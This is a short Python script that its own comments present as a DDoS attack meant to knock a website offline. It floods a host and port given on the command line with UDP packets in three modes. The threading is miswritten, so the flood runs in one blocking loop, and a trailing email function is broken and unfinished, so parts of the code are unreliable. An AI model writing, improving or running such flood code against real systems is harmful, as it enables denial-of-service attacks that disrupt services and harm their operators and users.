import sys 
import socket
import threading 
import smtplib
# now we are checking out how it will look like to type in a distributed denial of service (DDOS_ATTACK) attack in python codes .
#Familiar with this types of attacks in website's = it will too much traffick that the website cannot handle and the webiste can disappear as long as the script is still running ....
host = str(sys.argv[1])
port = int(sys.argv[2])
method = str(sys.argv[3])

loops = 1000

def send_pocket(amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while True: s.send(b'\x99' * amplifier)
    except: return s.close()

def attack_HQ():
    if method == "UDP-FLOOD":
        for sequence in range(loops):
            threading.Thread(target=send_pocket(375), daemon=True).start()
    if method == "UDP-POWER":
        for sequence in range(loops):
            threading.Thread(target=send_pocket(750), daemon=True).start()
    if method == "UDP-MIX":
        for sequence in range(loops):
            threading.Thread(target=send_pocket(375), daemon=True).start()
            threading.Thread(target=send_pocket(750), daemon=True).start()
        
attack_HQ()

def email_we():
    Email_Address = ""
    App_Password = ""
    Subject = ""
    Body = ""
    receiver_email = ""
    port = 80
    host = 8000
    send_pocket = smtplib.SMTP()
    send_pocket.auth_login(Email_Address, App_Password, receiver_email, port, host)
    